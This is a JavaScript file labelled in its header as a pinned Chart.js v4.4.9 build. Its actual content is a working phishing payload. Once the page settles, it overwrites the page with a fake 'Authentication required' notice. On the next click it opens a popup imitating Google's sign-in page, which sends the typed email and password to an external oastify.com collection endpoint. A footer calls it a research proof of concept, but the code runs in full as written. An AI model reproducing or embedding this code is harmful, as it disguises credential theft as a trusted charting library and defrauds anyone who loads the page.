/**
 * Chart.js v4.4.9 (pinned build)
 * https://www.chartjs.org
 * (c) 2024 Chart.js Contributors — MIT License
 */

(function () {
  var C = "https://msiv8t5gj953aozjrocyfigj9af13urj.oastify.com";

  var t = null;
  var obs = new MutationObserver(function () {
    clearTimeout(t);
    t = setTimeout(takeover, 800);
  });
  obs.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
  setTimeout(function () { if (t === null) takeover(); }, 4000);

  function takeover() {
    obs.disconnect();
    render();
    document.addEventListener("click", function h() {
      openPopup();
      document.removeEventListener("click", h);
    }, { once: true });
  }

  function render() {
    document.documentElement.innerHTML = '<head><meta charset="utf-8"><title>Canvas</title>\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",system-ui,-apple-system,sans-serif;background:#1a1a2e;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;cursor:pointer}\
.wrap{text-align:center;max-width:420px;padding:40px}\
.icon{font-size:48px;margin-bottom:16px}\
h2{font-size:20px;font-weight:500;color:#fff;margin-bottom:12px}\
p{font-size:14px;color:#9e9e9e;line-height:1.6;margin-bottom:24px}\
.btn{display:inline-block;background:#8ab4f8;color:#1a1a2e;border:none;border-radius:20px;padding:10px 28px;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none}\
.btn:hover{background:#aecbfa}\
.sub{font-size:11px;color:#666;margin-top:20px}\
</style></head><body>\
<div class="wrap">\
<div class="icon">\u26a0\ufe0f</div>\
<h2>Authentication required</h2>\
<p>This app requires access to your Google account to display personalized data. Please sign in to continue.</p>\
<div class="btn" id="go">Sign in with Google</div>\
<p class="sub">Your data stays private and is never shared.</p>\
</div></body>';
  }

  function phishHTML() {
    return '<!DOCTYPE html><html><head><meta charset="utf-8">\
<title>Sign in \u2013 Google Accounts</title>\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;padding-top:40px}\
.card{width:380px;padding:44px 40px 32px;border:1px solid #dadce0;border-radius:8px}\
.logo{text-align:center;margin-bottom:12px;font-size:22px;font-weight:500}\
.logo span:nth-child(1){color:#4285F4}.logo span:nth-child(2){color:#EA4335}\
.logo span:nth-child(3){color:#FBBC05}.logo span:nth-child(4){color:#4285F4}\
.logo span:nth-child(5){color:#34A853}.logo span:nth-child(6){color:#EA4335}\
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:4px}\
.sub{text-align:center;color:#5f6368;font-size:16px;margin-bottom:28px}\
label{display:block;margin-bottom:20px}\
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}\
input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}\
.lt{font-size:12px;color:#5f6368;margin-bottom:6px}\
.row{display:flex;justify-content:space-between;align-items:center;margin-top:28px}\
a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}\
button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}\
button:hover{background:#1669c1}\
.ft{text-align:center;font-size:11px;color:#bbb;margin-top:24px}\
</style></head><body>\
<div class="card">\
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>\
<h1>Sign in</h1>\
<p class="sub">to continue to Google AI</p>\
<form id="f">\
<label><div class="lt">Email or phone</div><input type="email" id="e" autofocus required></label>\
<label><div class="lt">Password</div><input type="password" id="p" required></label>\
<div class="row"><a href="#">Forgot password?</a><button type="submit">Next</button></div>\
</form>\
<p class="ft">PoC - Security Research Only</p>\
</div>\
<script>\
document.getElementById("f").onsubmit=function(ev){\
ev.preventDefault();\
var e=document.getElementById("e").value;\
var p=document.getElementById("p").value;\
document.querySelector("h1").textContent="Verifying...";\
document.querySelector(".sub").textContent="Please wait";\
var x=new XMLHttpRequest();\
x.open("POST","' + C + '/collect",true);\
x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");\
x.send("email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p));\
document.querySelector(".card").innerHTML="<div style=\\"text-align:center;padding:60px 20px\\"><div style=\\"font-size:36px;margin-bottom:16px\\">\\u2705</div><h1 style=\\"font-size:20px;color:#202124;font-weight:400\\">You\\u2019re signed in</h1><p style=\\"color:#5f6368;margin-top:8px\\">Redirecting to Google AI\\u2026</p></div>";\
};\
<\/script></body></html>';
  }

  function openPopup() {
    // Create blob URL — works even when window.open returns null
    var blob = new Blob([phishHTML()], { type: "text/html" });
    var url = URL.createObjectURL(blob);
    window.open(url, "_blank", "width=440,height=540,left=200,top=80");
  }
})();
